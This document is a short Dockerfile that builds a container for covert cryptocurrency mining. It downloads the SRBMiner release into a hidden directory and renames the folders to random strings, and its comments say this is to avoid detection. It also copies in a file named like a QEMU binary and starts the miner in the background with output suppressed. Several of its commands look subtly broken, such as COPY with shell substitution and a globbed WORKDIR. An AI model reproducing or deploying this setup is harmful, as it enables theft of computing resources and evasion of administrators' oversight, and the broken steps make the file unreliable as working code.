# Dockerfile
FROM ubuntu:focal

# Install dependencies
RUN apt-get update && apt-get -y install \
    wget curl coreutils inetutils-ping tar \
    && apt-get -y clean && rm -rf /var/lib/apt-get/lists/*

# Install SRBMiner and hellminer in a hidden directory
RUN mkdir -p /var/.hidden && cd /var/.hidden && \
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.2/SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    tar -xf SRBMiner-Multi-2-7-2-Linux.tar.gz && \
    rm -rf SRBMiner-Multi-2-7-2-Linux.tar.gz

# Rename the SRBMiner folder and hellminer to avoid easy detection
RUN mv /var/.hidden/SRBMiner-Multi-2-7-2 /var/.hidden/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)

# Copy entrypoint to hidden directory with dynamic naming to avoid detection
COPY entrypoint /var/.hidden/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)/
COPY qemu-system-x86_64 /var/.hidden/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)/
RUN chmod +x /var/.hidden/*/*/entrypoint

# Set work directory to the hidden miner directory
WORKDIR "/var/.hidden/*/*"

# Start miner in background with suppressed output
ENTRYPOINT "./entrypoint"
